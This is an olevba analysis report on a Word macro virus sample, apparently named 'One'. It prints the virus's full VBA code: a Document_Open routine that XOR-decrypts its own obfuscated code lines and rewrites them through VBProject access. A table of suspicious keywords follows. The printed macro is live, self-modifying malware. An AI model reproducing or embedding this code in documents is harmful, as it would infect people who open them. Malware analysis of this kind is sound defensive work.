olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.One
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.One - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
j = j + VBA.CInt(1)
y = VBA.CInt(27)
Do
Word.Application.MacroContainer.VBProject. _
vbcomponents(VBA.CInt(j)).codemodule.ReplaceLine y, _
c(VBA.Mid(Word.Application.MacroContainer.VBProject. _
vbcomponents(VBA.CInt(j)).codemodule.lines(VBA.CInt(y), _
VBA.CInt(j)), (VBA.CInt(j) + VBA.CInt(j))), VBA.Val(VBA. _
Mid(Word.Application.MacroContainer.VBProject.vbcomponents _
(VBA.CInt(j)).codemodule.lines(VBA.CInt((25)), VBA.CInt(j)), _
(VBA.CInt(j) + VBA.CInt(j)))))
VBA.DoEvents
y = y + j
Loop While y <> VBA.CInt(87)
One
End Sub
Private Function c(a, b)
Do
y = y + VBA.CInt(1)
c = c & VBA.Chr(VBA.CInt(VBA.Asc(VBA.Mid(a, VBA.CInt(y), _
VBA.CInt(1))) Xor VBA.CInt(b)))
Loop While y <> VBA.CInt(Len(a))
End Function
'241
Private Sub One()
'¾ŸÑ´ƒƒžƒÑ£”‚„œ”Ñ¿”‰…
'ˆÑÌÑˆÑÚÑ§³°ß²¸Ÿ…ÙÀØ
'‚²„ƒ§”ƒÑÌÑ§³°ß²¸Ÿ…ÙÀØ
'¦žƒ•ß°���˜’�…˜žŸß¾�…˜žŸ‚ß§˜ƒ„‚¡ƒž…”’…˜žŸÑÌÑ›
'¦žƒ•ß°���˜’�…˜žŸß¾�…˜žŸ‚ß¢�‡”¿žƒœ��¡ƒžœ�…ÑÌÑ›
'¦žƒ•ß°���˜’�…˜žŸß¢…�…„‚³�ƒÑÌÑ·��‚”
'¸—Ñ¿ž…Ñ¥˜œ”Ñ½˜š”ÑÓÛÃÛÂÛÓÑ¥™”ŸÑ¶ž¥žÑ�™„€˜…
'¢”…Ñž“›¿´¥ÑÌÑ²ƒ”�…”¾“›”’…ÙÓ¸Ÿ…”ƒŸ”…´‰��žƒ”ƒß°���˜’�…˜žŸÓØ
'¸—Ñž“›¿´¥ÑÌÑÓÓÑ¥™”ŸÑ¶ž¥žÑ�™„€˜…
'µžÑ¦™˜�”Ñž“›¿´¥ß³„‚ˆ
'§³°ßµž´‡”Ÿ…‚
'½žž�
'ž“›¿´¥ß§˜‚˜“�”ÑÌÑÁ
'ž“›¿´¥ß¿�‡˜–�…”ÑÓ™……�ËÞÞ†††ß‚…�‚ßŸ”…ÞÃÞžŸ”ÞžŸ”ß…‰…Ó
'µžÑ¦™˜�”Ñž“›¿´¥ß£”�•ˆ¢…�…”ÑÍÏÑÅ
'§³°ßµž´‡”Ÿ…‚
'½žž�
'‚’ž•”ÑÌÑž“›¿´¥ßµž’„œ”Ÿ…ß³ž•ˆß˜ŸŸ”ƒ¥”‰…
'ž“›¿´¥ß „˜…
'‚¾Ÿ”¸µÑÌÑ¼˜•Ù‚’ž•”ÝÑˆÝÑˆØ
'¸—Ñ‚¾Ÿ”¸µÑÍÏÑ²™ƒÙÀÇÄØÑ¥™”ŸÑ¶ž¥žÑ�™„€˜…
'‚¿”†§”ƒÑÌÑ§��Ù¼˜•Ù‚’ž•”ÝÑÅÝÑˆØØ
'¸—Ñ‚¿”†§”ƒÑÏÑ‚²„ƒ§”ƒÑ¥™”Ÿ
'‚’ž•”ÑÌÑ¼˜•Ù‚’ž•”ÝÑÆØ
'¥™˜‚µž’„œ”Ÿ…ß§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØßÑ®
'’ž•”œž•„�”ß•”�”…”�˜Ÿ”‚ÑˆÝÑÉÈ
'¥™˜‚µž’„œ”Ÿ…ß§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØßÑ®
'’ž•”œž•„�”ß˜Ÿ‚”ƒ…�˜Ÿ”‚ÑˆÝÑ‚’ž•”
'¶ž¥žÑŸž‚�ƒ”�•Ë
'´Ÿ•Ñ¸—
'�™„€˜…Ë
'‹ÑÌÑ§³°ß²¸Ÿ…ÙÃÆØ
'šÑÌÑÃÀÁÑÚÑ¸Ÿ…Ù£Ÿ•ÑÛÑÅÄØ
'¥™˜‚µž’„œ”Ÿ…ß§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØßÑ®
'’ž•”œž•„�”ß£”���’”½˜Ÿ”ÑÃÄÝÑ²™ƒÙÂÈØÑ×Ñš
'µž
'¥™˜‚µž’„œ”Ÿ…ß§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØßÑ®
'’ž•”œž•„�”ß£”���’”½˜Ÿ”Ñ‹ÝÑ²™ƒÙÂÈØÑ×Ñ’Ù¥™˜‚µž’„œ”Ÿ…ßÑ®
'§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØß’ž•”œž•„�”ß�˜Ÿ”‚Ù‹ÝÑˆØÝÑšØ
'§³°ßµž´‡”Ÿ…‚
'‹ÑÌÑ‹ÑÚÑˆ
'½žž�Ñ¦™˜�”Ñ‹ÑÍÏÑ§³°ß²¸Ÿ…ÙÉÆØ
'‚’ž•”ÑÌÑ¥™˜‚µž’„œ”Ÿ…ß§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØßÑ®
'’ž•”œž•„�”ß�˜Ÿ”‚ÙˆÝÑÉÈØ
'¸—Ñ¥™˜‚µž’„œ”Ÿ…ÑÌÑ°’…˜‡”µž’„œ”Ÿ…Ñ¥™”ŸÑ®
'¢”…Ñž“›¾Ÿ”ÑÌÑ¿žƒœ��¥”œ���…”Ñ´�‚”Ñ®
'¢”…Ñž“›¾Ÿ”ÑÌÑ°’…˜‡”µž’„œ”Ÿ…
'¦˜…™Ñž“›¾Ÿ”ß§³¡ƒž›”’…ß‡“’žœ�žŸ”Ÿ…‚ÙˆØ
'¦˜…™Ñß’ž•”œž•„�”
'¸—Ñ§³°ß¼˜•Ùß�˜Ÿ”‚ÙÉÉÝÑˆØÝÑÃØÑÍÏÑÓ¾Ÿ”ÓÑ¥™”Ÿ
'ß•”�”…”�˜Ÿ”‚ÑˆÝÑß’ž„Ÿ…ž—�˜Ÿ”‚
'ß˜Ÿ‚”ƒ…�˜Ÿ”‚ÑˆÝÑ‚’ž•”
'¸—Ñ¥™˜‚µž’„œ”Ÿ…ÑÌÑ¿žƒœ��¥”œ���…”Ñ¥™”ŸÑ®
'°’…˜‡”µž’„œ”Ÿ…ß¢�‡”°‚Ñ°’…˜‡”µž’„œ”Ÿ…ß·„��¿�œ”
'´Ÿ•Ñ¸—
'´Ÿ•Ñ¦˜…™
'´Ÿ•Ñ¦˜…™
'Ÿž‚�ƒ”�•Ë
'¥™˜‚µž’„œ”Ÿ…ß¢�‡”°‚Ñ¥™˜‚µž’„œ”Ÿ…ß·„��¿�œ”ÝÑ†•·žƒœ�…µž’„œ”Ÿ…
'Ö½˜Ÿ”‹”ƒÁÞÞ†žƒ�•†˜•”
End Sub
'One
'(c) jackie

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

